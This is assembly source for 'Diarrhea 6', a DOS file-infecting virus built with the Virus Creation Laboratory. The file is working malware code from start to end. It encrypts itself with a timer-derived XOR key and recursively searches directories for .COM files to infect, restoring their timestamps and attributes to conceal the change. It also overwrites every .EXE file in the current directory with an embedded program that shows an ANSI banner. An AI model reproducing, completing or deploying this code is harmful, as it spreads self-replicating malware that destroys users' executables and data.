; DIARRHE6.ASM -- DIARRHEA 6
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by URNST KOUCH

virus_type      equ     0                       ; Appending Virus
is_encrypted    equ     1                       ; We're encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

main            proc    near
		db      0E9h,00h,00h            ; Near jump (for compatibility)
start:          call    find_offset             ; Like a PUSH IP
find_offset:    pop     bp                      ; BP holds old IP
		sub     bp,offset find_offset   ; Adjust for length of host

		call    encrypt_decrypt         ; Decrypt the virus

start_of_code   label   near

		lea     si,[bp + buffer]        ; SI points to original start
		mov     di,0100h                ; Push 0100h on to stack for
		push    di                      ; return to main program
		movsw                           ; Copy the first two bytes
		movsb                           ; Copy the third byte

		mov     di,bp                   ; DI points to start of virus

		mov     bp,sp                   ; BP points to stack
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer on stack
		int     021h

		call    search_files            ; Find and infect a file
		call    search_files            ; Find and infect another file
		lea     dx,[di + data00]        ; DX points to data
		lea     si,[di + data01]        ; SI points to data
		push    di                      ; Save DI
		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		mov     di,bx                   ; DI points to DTA
		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		int     021h
		jc      create_file             ; If not found then create it
write_in_file:  mov     ax,04301h               ; DOS set file attributes function
		xor     cx,cx                   ; File will have no attributes
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		mov     ax,03D01h               ; DOS open file function, write
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; Transfer file handle to AX
		mov     ah,040h                 ; DOS write to file function
		mov     cx,[si]                 ; CX holds number of byte to write
		lea     dx,[si + 2]             ; DX points to the data
		int     021h
		mov     ax,05701h               ; DOS set file date/time function
		mov     cx,[di + 016h]          ; CX holds old file time
		mov     dx,[di + 018h]          ; DX holds old file data
		int     021h
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		mov     ax,04301h               ; DOS set file attributes function
		xor     ch,ch                   ; Clear CH for attributes
		mov     cl,[di + 015h]          ; CL holds old attributes
		lea     dx,[di + 01Eh]          ; DX points to file name
		int     021h
		mov     ah,04Fh                 ; DOS find next file function
		int     021h
		jnc     write_in_file           ; If successful do next file
		jmp     short dropper_end       ; Otherwise exit
create_file:    mov     ah,03Ch                 ; DOS create file function
		xor     cx,cx                   ; File has no attributes
		int     021h
		xchg    bx,ax                   ; Transfer file handle to AX
		mov     ah,040h                 ; DOS write to file function
		mov     cx,[si]                 ; CX holds number of byte to write
		lea     dx,[si + 2]             ; DX points to the data
		int     021h
		mov     ah,03Eh                 ; DOS close file function
		int     021h
dropper_end:    pop     di                      ; Restore DI


com_end:        pop     dx                      ; DX holds original DTA address
		mov     ah,01Ah                 ; DOS set DTA function
		int     021h

		mov     sp,bp                   ; Deallocate local buffer

		xor     ax,ax                   ;
		mov     bx,ax                   ;
		mov     cx,ax                   ;
		mov     dx,ax                   ; Empty out the registers
		mov     si,ax                   ;
		mov     di,ax                   ;
		mov     bp,ax                   ;

		ret                             ; Return to original program
main            endp

search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + root]          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		lea     dx,[di + all_files]     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[di + up_dir]        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		lea     dx,[di + com_mask]      ; DX points to "*.COM"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
com_mask        db      "*.COM",0               ; Mask for all .COM files
traverse        endp

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ah],(65279 - (finish - start))
		jbe     size_ok                 ; If it's small enough continue
		jmp     infection_done          ; Otherwise exit

size_ok:        mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,3                    ; CX holds bytes to read (3)
		lea     dx,[di + buffer]        ; DX points to buffer
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		xchg    dx,ax                   ; Faster than a PUSH AX
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		xchg    dx,ax                   ; Faster than a POP AX

		sub     ax,finish - start + 3   ; Adjust AX for a valid jump
		cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je      infection_done          ; If equal then exit
		mov     byte ptr [di + set_carry],1  ; Success -- the file is OK
		add     ax,finish - start       ; Re-adjust to make the jump
		mov     word ptr [di + new_jump + 1],ax  ; Construct jump

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,3                    ; CX holds bytes to write (3)
		lea     dx,[di + new_jump]      ; DX points to the jump we made
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		push    si                      ; Save SI through call
		call    encrypt_code            ; Write an encrypted copy
		pop     si                      ; Restore SI

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

set_carry       db      ?                       ; Set-carry-on-exit flag
buffer          db      090h,0CDh,020h          ; Buffer to hold old three bytes
new_jump        db      0E9h,?,?                ; New jump to virus
infect_file     endp


data00            db   "*.EXE",0

data01          dw       254h
		db      0EBh, 03Dh, 090h, 000h, 064h, 001h, 002h, 000h
		db      000h, 054h, 068h, 065h, 044h, 072h, 061h, 077h
		db      020h, 043h, 04Fh, 04Dh, 020h, 066h, 069h, 06Ch
		db      065h, 020h, 053h, 063h, 072h, 065h, 065h, 06Eh
		db      020h, 053h, 061h, 076h, 065h, 01Ah, 055h, 06Eh
		db      073h, 075h, 070h, 070h, 06Fh, 072h, 074h, 065h
		db      064h, 020h, 056h, 069h, 064h, 065h, 06Fh, 020h
		db      04Dh, 06Fh, 064h, 065h, 00Dh, 00Ah, 024h, 0B4h
		db      00Fh, 0CDh, 010h, 0BBh, 000h, 0B8h, 03Ch, 002h
		db      074h, 018h, 03Ch, 003h, 074h, 014h, 0C6h, 006h
		db      003h, 001h, 000h, 0BBh, 000h, 0B0h, 03Ch, 007h
		db      074h, 008h, 0BAh, 026h, 001h, 0B4h, 009h, 0CDh
		db      021h, 0C3h, 08Eh, 0C3h, 08Bh, 03Eh, 007h, 001h
		db      0BEh, 0F0h, 001h, 0BAh, 0DAh, 003h, 0B3h, 009h
		db      08Bh, 00Eh, 004h, 001h, 0FCh, 033h, 0C0h, 0ACh
		db      03Ch, 01Bh, 075h, 005h, 080h, 0F4h, 080h, 0EBh
		db      06Ah, 03Ch, 010h, 073h, 007h, 080h, 0E4h, 0F0h
		db      00Ah, 0E0h, 0EBh, 05Fh, 03Ch, 018h, 074h, 013h
		db      073h, 01Fh, 02Ch, 010h, 002h, 0C0h, 002h, 0C0h
		db      002h, 0C0h, 002h, 0C0h, 080h, 0E4h, 08Fh, 00Ah
		db      0E0h, 0EBh, 048h, 08Bh, 03Eh, 007h, 001h, 081h
		db      0C7h, 0A0h, 000h, 089h, 03Eh, 007h, 001h, 0EBh
		db      03Ah, 08Bh, 0E9h, 0B9h, 001h, 000h, 03Ch, 019h
		db      075h, 008h, 0ACh, 08Ah, 0C8h, 0B0h, 020h, 04Dh
		db      0EBh, 00Ah, 03Ch, 01Ah, 075h, 007h, 0ACh, 04Dh
		db      08Ah, 0C8h, 0ACh, 04Dh, 041h, 080h, 03Eh, 003h
		db      001h, 000h, 074h, 013h, 08Ah, 0F8h, 0ECh, 0D0h
		db      0D8h, 072h, 0FBh, 0ECh, 022h, 0C3h, 075h, 0FBh
		db      08Ah, 0C7h, 0ABh, 0E2h, 0F1h, 0EBh, 002h, 0F3h
		db      0ABh, 08Bh, 0CDh, 0E3h, 002h, 0E2h, 088h, 0C3h
		db      00Fh, 010h, 019h, 04Fh, 018h, 019h, 04Fh, 018h
		db      019h, 04Fh, 018h, 019h, 003h, 009h, 01Bh, 0DAh
		db      01Ah, 044h, 0C4h, 0BFh, 019h, 004h, 018h, 019h
		db      003h, 0B3h, 00Ch, 01Bh, 0D2h, 0C4h, 0C4h, 0BFh
		db      020h, 0D6h, 0C4h, 0C4h, 0BFh, 020h, 0D6h, 0C4h
		db      0D2h, 0C4h, 0BFh, 020h, 020h, 0D6h, 0C4h, 0D2h
		db      0C4h, 0BFh, 020h, 0D2h, 020h, 020h, 0C2h, 020h
		db      020h, 0D2h, 0C4h, 0C4h, 0BFh, 020h, 0C4h, 0D2h
		db      0C4h, 020h, 0D6h, 0C4h, 0C4h, 0BFh, 020h, 0D2h
		db      0C4h, 0C4h, 0BFh, 020h, 0D2h, 0C4h, 0C4h, 0BFh
		db      020h, 0D2h, 020h, 020h, 0C2h, 020h, 0D2h, 0C4h
		db      0C4h, 0BFh, 020h, 0D6h, 0C4h, 0C4h, 0BFh, 020h
		db      0D2h, 009h, 01Bh, 0B3h, 019h, 004h, 018h, 019h
		db      003h, 0B3h, 00Ch, 01Bh, 0C7h, 0C4h, 019h, 002h
		db      0C7h, 0C4h, 0C4h, 0B4h, 019h, 002h, 0BAh, 019h
		db      003h, 0BAh, 020h, 0BAh, 020h, 0B3h, 020h, 0D3h
		db      0C4h, 0C4h, 0B4h, 020h, 020h, 0BAh, 020h, 020h
		db      0B3h, 020h, 020h, 0BAh, 020h, 020h, 0C7h, 0C4h
		db      0C4h, 0B4h, 020h, 0C7h, 0C4h, 0C2h, 0D9h, 020h
		db      0C7h, 0C4h, 0C2h, 0D9h, 020h, 0C7h, 0C4h, 0C4h
		db      0B4h, 020h, 0C7h, 0C4h, 019h, 002h, 0C7h, 0C4h
		db      0C4h, 0B4h, 020h, 0BAh, 009h, 01Bh, 0B3h, 019h
		db      004h, 018h, 019h, 003h, 0B3h, 00Ch, 01Bh, 0D0h
		db      0C4h, 0C4h, 0D9h, 020h, 0D0h, 020h, 020h, 0C1h
		db      019h, 002h, 0D0h, 019h, 003h, 0D0h, 020h, 0D0h
		db      020h, 0C1h, 020h, 0D3h, 0C4h, 0C4h, 0D9h, 020h
		db      020h, 0D0h, 0C4h, 0C4h, 0D9h, 020h, 0C4h, 0D0h
		db      0C4h, 020h, 0D0h, 020h, 020h, 0C1h, 020h, 0D0h
		db      020h, 0C1h, 020h, 020h, 0D0h, 020h, 0C1h, 020h
		db      020h, 0D0h, 020h, 020h, 0C1h, 020h, 0D0h, 0C4h
		db      0C4h, 0D9h, 020h, 0D0h, 020h, 020h, 0C1h, 020h
		db      06Fh, 009h, 01Bh, 0B3h, 019h, 004h, 018h, 019h
		db      003h, 0B3h, 019h, 014h, 00Eh, 01Bh, 02Dh, 02Dh
		db      047h, 047h, 020h, 041h, 06Ch, 06Ch, 069h, 06Eh
		db      020h, 026h, 020h, 054h, 068h, 065h, 020h, 054h
		db      065h, 078h, 061h, 073h, 020h, 04Eh, 061h, 07Ah
		db      069h, 073h, 019h, 013h, 009h, 01Bh, 0B3h, 019h
		db      004h, 018h, 019h, 003h, 0C0h, 01Ah, 044h, 0C4h
		db      0D9h, 019h, 004h, 018h, 019h, 04Fh, 018h, 019h
		db      04Fh, 018h, 019h, 04Fh, 018h, 019h, 04Fh, 018h
		db      019h, 04Fh, 018h, 019h, 04Fh, 018h, 019h, 04Fh
		db      018h, 019h, 04Fh, 018h, 019h, 04Fh, 018h, 019h
		db      04Fh, 018h, 019h, 04Fh, 018h, 019h, 04Fh, 018h
		db      019h, 04Fh, 018h, 019h, 04Fh, 018h, 019h, 04Fh
		db      018h, 019h, 04Fh, 018h

vcl_marker      db      "[VCL]",0               ; VCL creation marker

encrypt_code    proc    near
		push    bp                      ; Save BP
		mov     bp,di                   ; Use BP as pointer to code
		lea     si,[bp + encrypt_decrypt]; SI points to cipher routine

		xor     ah,ah                   ; BIOS get time function
		int     01Ah
		mov     word ptr [si + 9],dx    ; Low word of timer is new key

		xor     byte ptr [si + 1],8     ;
		xor     byte ptr [si + 8],1     ; Change all SIs to DIs
		xor     word ptr [si + 11],0101h; (and vice-versa)

		lea     di,[bp + finish]        ; Copy routine into heap
		mov     cx,finish - encrypt_decrypt - 1  ; All but final RET
		push    si                      ; Save SI for later
		push    cx                      ; Save CX for later
	rep     movsb                           ; Copy the bytes

		lea     si,[bp + write_stuff]   ; SI points to write stuff
		mov     cx,5                    ; CX holds length of write
	rep     movsb                           ; Copy the bytes

		pop     cx                      ; Restore CX
		pop     si                      ; Restore SI
		inc     cx                      ; Copy the RET also this time
	rep     movsb                           ; Copy the routine again

		mov     ah,040h                 ; DOS write to file function
		lea     dx,[bp + start]         ; DX points to virus

		lea     si,[bp + finish]        ; SI points to routine
		call    si                      ; Encrypt/write/decrypt

		mov     di,bp                   ; DI points to virus again
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

write_stuff:    mov     cx,finish - start       ; Length of code
		int     021h
encrypt_code    endp

end_of_code     label   near

encrypt_decrypt proc    near
		lea     si,[bp + start_of_code] ; SI points to code to decrypt
		mov     cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:       db      081h,034h,00h,00h       ; XOR a word by the key
		inc     si                      ; Do the next word
		inc     si                      ;
		loop    xor_loop                ; Loop until we're through
		ret                             ; Return to caller
encrypt_decrypt endp
finish          label   near

code            ends
		end     main
